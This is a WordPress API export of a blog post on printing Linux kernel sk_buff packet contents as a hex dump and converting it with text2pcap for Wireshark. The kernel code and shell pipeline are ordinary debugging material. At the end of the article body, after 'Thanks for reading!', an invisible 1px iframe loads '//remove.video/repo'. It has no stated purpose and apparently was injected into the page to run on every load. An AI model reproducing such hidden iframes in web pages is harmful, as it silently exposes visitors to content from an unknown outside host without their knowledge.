{"id":953,"date":"2019-10-17T01:41:31","date_gmt":"2019-10-16T22:41:31","guid":{"rendered":"http:\/\/olegkutkov.me\/?p=953"},"modified":"2021-02-04T13:22:23","modified_gmt":"2021-02-04T11:22:23","slug":"printing-sk_buff-data","status":"publish","type":"post","link":"https:\/\/olegkutkov.me\/2019\/10\/17\/printing-sk_buff-data\/","title":{"rendered":"Printing sk_buff data"},"content":{"rendered":"<p><img loading=\"lazy\" decoding=\"async\" class=\"wp-image-954 alignleft\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/net_packet-150x150.png\" alt=\"\" width=\"143\" height=\"143\" \/>Sometimes when working with network packets inside the Linux kernel, it might be very useful to print packet contents to see what is actually going on.<br \/>\nHere I&#8217;m describing how to print packet from <strong>sk_buff<\/strong> structure and analyze this data with Wireshark.<br \/>\nIn this short note, I will not describe capturing the packets inside the kernel but only show how to print the <strong>sk_buff<\/strong>.<\/p>\n<p><!--more--><\/p>\n<p>Struct <strong>sk_buff<\/strong> is a famous Linux kernel structure that holds network packets (with all headers) during travel through the Linux network stack.<\/p>\n<p>As you probably know, <strong>sk_buff<\/strong> contains a few pointers representing different regions in the one memory that contains all data of the packet.<br \/>\nPointers &#8216;<strong>data<\/strong>&#8216; and &#8216;<strong>tail<\/strong>&#8216; may be changed on different layers of the network stack.<\/p>\n<figure id=\"attachment_955\" aria-describedby=\"caption-attachment-955\" style=\"width: 522px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" class=\"wp-image-955 size-full\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/skb_layout.png\" alt=\"\" width=\"522\" height=\"377\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/skb_layout.png 522w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/skb_layout-300x217.png 300w\" sizes=\"(max-width: 522px) 100vw, 522px\" \/><figcaption id=\"caption-attachment-955\" class=\"wp-caption-text\">Image credits: kernel.org<\/figcaption><\/figure>\n<p>Let&#8217;s describe the reception of the packet. The initial state &#8216;<strong>data<\/strong>&#8216; points directly to the beginning of the packet on the Ethernet header.<br \/>\nIt&#8217;s the L2 layer of the network stack. The L3 layer &#8216;data&#8217; pointer is incremented by the Ethernet header&#8217;s size and points on the IP header. And so on.<br \/>\nBut we still can access the Start of the packet and Ethernet header because data is still here.<br \/>\nLinux kernel provides a set of functions to access the different layers headers and <strong>sk_buff<\/strong> pointers manipulation. It&#8217;s highly recommended to use these functions instead of direct pointers access. Please refer <strong><em>include\/linux\/skbuff.h<\/em><\/strong><\/p>\n<p>If we want to print a full packet with a network header, we need to reach the mac header&#8217;s pointer.<br \/>\nFunction <strong>skb_mac_header()<\/strong> can help us.<br \/>\nLet&#8217;s check how this function is implemented.<\/p>\n<pre class=\"prettyprint\">static inline unsigned char *skb_mac_header(const struct sk_buff *skb)\n{\n    return skb-&gt;head + skb-&gt;mac_header;\n}<\/pre>\n<p>As you can see, this function is straightforward. The result is offset from the <strong>sk_buff<\/strong> memory start (head) by some value from <strong>the mac_header<\/strong> variable. This variable initialized during packet reception in a driver (or in the stack during packet generation and transmission).<\/p>\n<p>You can see function <strong>skb_reset_mac_header()<\/strong> which set mac_header to the position of the &#8216;data&#8217; pointer. This might be useful during the initial construction of the packet inside <strong>sk_buff<\/strong>.<\/p>\n<p>Also, you may know function <strong>eth_hdr()<\/strong><br \/>\nThis function is just a simple wrapper around <strong>skb_mac_header()<\/strong> with typecasting.<\/p>\n<pre class=\"prettyprint\">static inline struct ethhdr *eth_hdr(const struct sk_buff *skb)\n{\n    return (struct ethhdr *)skb_mac_header(skb);\n}<\/pre>\n<p>Now we can get a pointer to the whole packet, so it&#8217;s time to print some data.<\/p>\n<p>We can print an Ethernet header with source\/destination addresses and protocol numbers if it&#8217;s required.<\/p>\n<pre class=\"prettyprint\">struct ethhdr *ether = eth_hdr(skb);\n\nprintk(\"Source: %x:%x:%x:%x:%x:%x\\n\", ether-&gt;h_source[0], ether-&gt;h_source[1], ether-&gt;h_source[2], ether-&gt;h_source[3], ether-&gt;h_source[4], ether-&gt;h_source[5]);\nprintk(\"Destination: %x:%x:%x:%x:%x:%x\\n\", ether-&gt;h_dest[0], ether-&gt;h_dest[1], ether-&gt;h_dest[2], ether-&gt;h_dest[3], ether-&gt;h_dest[4], ether-&gt;h_dest[5]);\nprintk(\"Protocol: %d\\n\", ether-&gt;h_proto);<\/pre>\n<p>Please note that the protocol number is in network byte order.<\/p>\n<p>Typically network packets are printed as hex string by 16 bytes in one line and with line numbering.<br \/>\nSomething like this:<\/p>\n<pre>000000 FF FF FF FF FF FF 20 CF 30 38 56 A1 08 06 00 01\n000010 08 00 06 04 00 01 20 CF 30 38 56 A1 C0 A8 01 02\n000020 00 00 00 00 00 00 C0 A8 01 05 00 00 00 00 00 00 \n000030 00 00 00 00 00 00 00 00 00 00 00 00<\/pre>\n<p>To get such output, we can write a simple function.<\/p>\n<pre class=\"prettyprint\">void pkt_hex_dump(struct sk_buff *skb)\n{\n    size_t len;\n    int rowsize = 16;\n    int i, l, linelen, remaining;\n    int li = 0;\n    uint8_t *data, ch; \n\n    printk(\"Packet hex dump:\\n\");\n    data = (uint8_t *) skb_mac_header(skb);\n\n    if (skb_is_nonlinear(skb)) {\n        len = skb-&gt;data_len;\n    } else {\n        len = skb-&gt;len;\n    }\n\n    remaining = len;\n    for (i = 0; i &lt; len; i += rowsize) {\n        printk(\"%06d\\t\", li);\n\n        linelen = min(remaining, rowsize);\n        remaining -= rowsize;\n\n        for (l = 0; l &lt; linelen; l++) {\n            ch = data[l];\n            printk(KERN_CONT \"%02X \", (uint32_t) ch);\n        }\n\n        data += linelen;\n        li += 10; \n\n        printk(KERN_CONT \"\\n\");\n    }\n}<\/pre>\n<p>KERN_CONT in printk allows us to add data to the message buffer without flushing and without printing module name (and other information) at the beginning of every string. Except for time \ud83d\ude42<\/p>\n<p>After executing this function, you can find in dmesg something like this:<\/p>\n<pre>[ 1869.042384] 000000   FF FF FF FF FF FF 20 CF 30 38 56 A1 08 06 00 01\n[ 1869.042424] 000010   08 00 06 04 00 01 20 CF 30 38 56 A1 C0 A8 01 02 \n[ 1869.042463] 000020   00 00 00 00 00 00 C0 A8 01 05 00 00 00 00 00 00 \n[ 1869.042502] 000030   00 00 00 00 00 00 00 00 00 00 00 00<\/pre>\n<p>To analyze this data with Wireshark (which is very handy), we need to copy this text in some text files (for example, packet_dump.txt), remove timestamps, and convert this text into binary pcap format.<\/p>\n<p>We need text2pcap utility, which can be found in most Linux distros.<\/p>\n<p>Run the following command:<\/p>\n<pre>cat packet_dump.txt | awk '{$1=\"\"; print $0}' | text2pcap - hex_dump.pcap<\/pre>\n<p>Now open the resulting <strong>hex_dump.pcap<\/strong> with Wireshark.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/wireshark_p.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-964\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/wireshark_p.png\" alt=\"\" width=\"700\" height=\"619\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/wireshark_p.png 960w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/wireshark_p-300x265.png 300w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2019\/10\/wireshark_p-768x679.png 768w\" sizes=\"(max-width: 700px) 100vw, 700px\" \/><\/a><\/p>\n<p>I can recommend using this method to print and analyze only small and medium-size packets. Large packets may hang or slow down your system during printing.<\/p>\n<p>Thanks for reading!<\/p>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n","protected":false},"excerpt":{"rendered":"<p>Sometimes when working with network packets inside the Linux kernel, it might be very useful to print packet contents to see what is actually going on. Here I&#8217;m describing how to print packet from sk_buff structure and analyze this data with Wireshark. In this short note, I will not describe capturing the packets inside the [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[76,25,78,54],"tags":[40,27,29,79],"_links":{"self":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/953"}],"collection":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/comments?post=953"}],"version-history":[{"count":11,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/953\/revisions"}],"predecessor-version":[{"id":1733,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/953\/revisions\/1733"}],"wp:attachment":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/media?parent=953"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/categories?post=953"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/tags?post=953"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}